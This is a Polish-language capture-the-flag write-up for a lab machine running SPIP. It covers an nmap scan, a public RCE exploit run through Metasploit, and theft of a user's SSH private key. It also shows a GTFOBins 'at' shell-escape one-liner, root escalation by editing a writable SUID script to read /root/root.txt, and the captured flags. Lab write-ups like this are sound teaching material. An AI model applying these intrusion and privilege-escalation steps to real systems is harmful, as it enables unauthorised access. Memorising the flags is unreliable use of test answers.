# **Nmap Results**
```text
nmap 10.10.24.7 -p- --min-rate 2000 -Pn -sC -sV --oN nmap_scan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 12:13 CET
Nmap scan report for 10.10.24.7
Host is up (0.068s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2a:98:15:79:d0:2f:5a:25:da:54:79:8a:f6:ad:9f:94 (RSA)
|   256 2b:0e:33:94:59:df:ca:a9:f8:9d:d8:cc:90:87:2d:1e (ECDSA)
|_  256 62:a5:58:da:2b:6a:39:b2:8e:50:c4:90:75:72:13:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.80 seconds
```

# **Service Enumeration**

## **TCP/22** - SSH

Na systemie działa SSH.

## **TCP/80**  - HTTP

Widok strony na ip 10.10.24.7 na porcie 80.
![](Attatchments/Pasted%20image%2020251105122158.png)

Skanowanie folderów strony wykazało ciekawy folder `/spip`

![](Attatchments/Pasted%20image%2020251105123150.png)

Pod nim znajduje się podstrona:

![](Attatchments/Pasted%20image%2020251105123230.png)

Sprawdzając źródło strony znalazłem wersję tego CMS

![](Attatchments/Pasted%20image%2020251105124246.png)

Po sprawdzeniu wersji tego CMS znalazłem exploit pozwalający na RCE
https://www.exploit-db.com/exploits/51536

# **Exploit**

Exploit w msfconsole

![](Attatchments/Pasted%20image%2020251105142152.png)

Teraz mając sesję w meterpreter znalazłem flagę w `/home/think/user.txt`

![](Attatchments/Pasted%20image%2020251105143243.png)

Dalej wiedząć, że na systemie działa SSH, pobrałem z katalogu domowego użytkownika plik z kluczem prywatnym i wykorzystałem do logowania w celu zdobycia jego konta.

![](Attatchments/Pasted%20image%2020251105143647.png)


# **Post-Exploit Enumeration**
## **Operating Environment**
### OS & Kernel

```text
- "uname -a" Linux ip-10-10-24-7 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
  - "cat /etc/os-release" NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

```


# **Privilege Escalation**  


Poleceniem `find / -type f -perm /4000 -exec ls -l {} \; 2>/dev/null` znalazłem ciekawy program `at`

![](Attatchments/Pasted%20image%2020251105151001.png)

Ze strony https://gtfobins.github.io/gtfobins/at/ dowiedziałem się, że skryptem `echo "/bin/bash <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null` można uciec z ograniczonego środowiska.

![](Attatchments/Pasted%20image%2020251105160911.png)

Dalej to samo polecenie zwraca program `run_container`, który wykonuje się z prawami roota (SUID). Sam skrypt programu w `.sh` znajduje się w `/opt` i można go edytować z pozycji użytkownika think.

![](Attatchments/Pasted%20image%2020251105161011.png)

Dodając na początku programu:

```
echo `cat /root/root.txt`
```

po uruchomieniu go w /usr/sbin dostajemy flagę root.

![](Attatchments/Pasted%20image%2020251105161301.png)
# **Flags**

### User

```text
fa229046d44eda6a3598c73ad96f4ca5
```

### Root

```text
3a4225cc9e85709adda6ef55d6a4f2ca
```


<br>
<br>
